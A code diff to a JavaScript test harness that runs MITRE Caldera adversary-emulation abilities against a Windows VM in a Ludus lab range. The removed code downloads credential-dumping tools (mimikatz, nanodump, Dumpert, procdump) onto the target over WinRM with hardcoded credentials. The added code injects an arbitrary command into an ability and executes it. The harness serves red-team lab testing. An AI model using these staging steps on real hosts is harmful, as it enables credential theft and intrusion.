@@ -81,23 +81,10 @@ exit(r.status_code)
   return result.stdout.toString().trim()
 }
 
-function normalizePrereq(script) {
-  return script
-    .replace(/\\\s*\n\s*/g, " ")
-    .replace(/\n+/g, " && ")
-    .trim()
-}
-
 function normalizeWinPrereq(script) {
   return script
     .replace(/\n+/g, "; ")
     .trim()
-}
-
-async function installKaliPrereq(ip, script) {
-  if (!script) return
-  const cmd = normalizePrereq(script)
-  await sshRun(ip, "kali", "kali", cmd)
 }
 
 async function installWinPrereq(ip, script) {
@@ -177,74 +164,19 @@ async function waitForAgent(group, timeoutMs = 60000) {
   throw new Error(`Agent with group "${group}" did not check in within ${timeoutMs}ms`)
 }
 
-async function deployAbilityPayload(ip, ability) {
-  const match = ability.executors[0].command.match(/ExternalPayloads\\([^\s"]+)/)
-  if (!match) return null
-  const filename = match[1]
-  const destPath = `C:\\Users\\Public\\${filename}`
 
-  try {
-    await winrmRun(ip, "localuser", "password",
-      `powershell -Command "if (Test-Path '${destPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
-  } catch { return destPath }
 
-  const PAYLOAD_URLS = {
-    "procdump.exe":          { url: "https://download.sysinternals.com/files/Procdump.zip",            zipEntry: "procdump64.exe" },
-    "procdump64.exe":        { url: "https://download.sysinternals.com/files/Procdump.zip",            zipEntry: "procdump64.exe" },
-    "Outflank-Dumpert.exe":  { url: "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" },
-    "nanodump.x64.exe":      { url: "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" },
-    "mimikatz.exe":          { url: "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip", zipEntry: "x64\\mimikatz.exe" },
-  }
-  const info = PAYLOAD_URLS[filename]
-  if (!info) return null
-
-  const { url, zipEntry } = info
-  console.log(`[server] deployAbilityPayload: deploying ${filename} from ${url}`)
-
-  if (zipEntry) {
-    const destDir = destPath.includes("\\") ? destPath.replace(/[^\\]+$/, "") : ""
-    const mkdirCmd = destDir ? `New-Item -ItemType Directory -Force -Path '${destDir}'; ` : ""
-    await winrmRun(ip, "localuser", "password",
-      `powershell -Command "${mkdirCmd}Invoke-WebRequest -Uri '${url}' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\${zipEntry}' '${destPath}' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force; Write-Host 'DEPLOYED'"`)
-  } else {
-    await winrmRun(ip, "localuser", "password",
-      `powershell -Command "Invoke-WebRequest -Uri '${url}' -OutFile '${destPath}'; Write-Host 'DEPLOYED'"`)
-  }
-  console.log(`[server] deployAbilityPayload: ${filename} deployed to ${destPath}`)
-
-  if (filename.includes("procdump")) {
-    await winrmRun(ip, "localuser", "password",
-      `reg add "HKU\\S-1-5-18\\Software\\Sysinternals\\ProcDump" /v EulaAccepted /t REG_DWORD /d 1 /f`)
-    console.log(`[server] deployAbilityPayload: EULA pre-accepted for SYSTEM`)
-  }
-
-  return destPath
-}
-
-async function exploitAbility(paw, ability, payloadPath) {
-  const abilityId = ability.ability_id
+async function exploitAbility(paw, abilityId, rewrittenCommand) {
   console.log(`[server] exploitAbility(paw=${paw}, abilityId=${abilityId})`)
 
   const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
-  const cmdField = "executors.0.command"
-
   const modified = structuredClone(original)
-  const oldCmd = modified.executors[0].command
-
-  if (payloadPath !== null) {
-    modified.executors[0].command = oldCmd.replace(
-      /"?PathToAtomicsFolder[^"\s]*"?/,
-      `"${payloadPath}"`
-    )
-    console.log(`[server] exploitAbility: command "${oldCmd.slice(0, 60)}..." → "${modified.executors[0].command.slice(0, 60)}..."`)
-  } else {
-    console.log(`[server] exploitAbility: no PathToAtomicsFolder to replace, running command as-is`)
-  }
+  modified.executors[0].command = rewrittenCommand
+  console.log(`[server] exploitAbility: command set to "${rewrittenCommand.slice(0, 60)}..."`)
 
   await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
 
   try {
-    console.log(`[server] exploitAbility: POST /plugin/access/exploit`)
     const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw, ability_id: abilityId, obfuscator: "plain-text" })
     console.log(`[server] exploitAbility: exploit result=${JSON.stringify(exploitResult)}`)
 
@@ -277,10 +209,9 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
   let group = null
   let winVm = null
   let agentPaw = null
-  let originalAbility = null
 
   try {
-    const { abilityId, name, kaliPrereq, winPrereq } = data.data || {}
+    const { abilityId, name, winPrereq, command } = data.data || {}
     if (!abilityId) {
       sendStatus(ws, "complete", "error", "No ability selected for testing")
       return
@@ -346,15 +277,8 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
     }
     winVm = winTarget
 
-    const kaliVm = targets.find(t => t.key === "attacker-kali")
-
-    if (kaliPrereq || winPrereq) {
+    if (winPrereq) {
       sendStatus(ws, "prereqInstall", "running", "Installing prerequisites...")
-      if (kaliPrereq && kaliVm?.vm?.ip) {
-        await installKaliPrereq(kaliVm.vm.ip, kaliPrereq)
-        sendStatus(ws, "prereqInstall", "running", "Kali prerequisites installed, waiting for Caldera...")
-        await waitForCaldera()
-      }
       if (winPrereq) {
         await installWinPrereq(winVm.vm.ip, winPrereq)
       }
@@ -377,23 +301,14 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
     agentPaw = agent.paw
     sendStatus(ws, "agentWait", "success", `Agent "${agent.paw}" checked in`)
 
-    sendStatus(ws, "abilityLookup", "running", `Fetching ability "${name}"...`)
+    sendStatus(ws, "abilityLookup", "running", `Verifying ability "${name}"...`)
     const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
-    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
-    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
-    console.log(`[server] ability executors: platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
+    const found = Array.isArray(abilities) ? abilities.some(a => a.ability_id === abilityId) : !!abilities
+    if (!found) throw new Error(`Ability "${abilityId}" not found in Caldera`)
     sendStatus(ws, "abilityLookup", "success", `Ability "${name}" found`)
 
-    sendStatus(ws, "payloadDeploy", "running", "Deploying ability payload to Windows target...")
-    const payloadPath = await deployAbilityPayload(winVm.vm.ip, ability)
-    if (payloadPath) {
-      sendStatus(ws, "payloadDeploy", "success", `Payload deployed to ${payloadPath}`)
-    } else {
-      sendStatus(ws, "payloadDeploy", "success", "No payload needed")
-    }
-
     sendStatus(ws, "abilityExploit", "running", `Exploiting agent with ability "${name}"...`)
-    const result = await exploitAbility(agent.paw, ability, payloadPath ?? null)
+    const result = await exploitAbility(agent.paw, abilityId, command)
     const factsCount = result?.facts?.length || 0
     sendStatus(ws, "abilityExploit", "success", `Ability executed — ${factsCount} facts collected`)
 
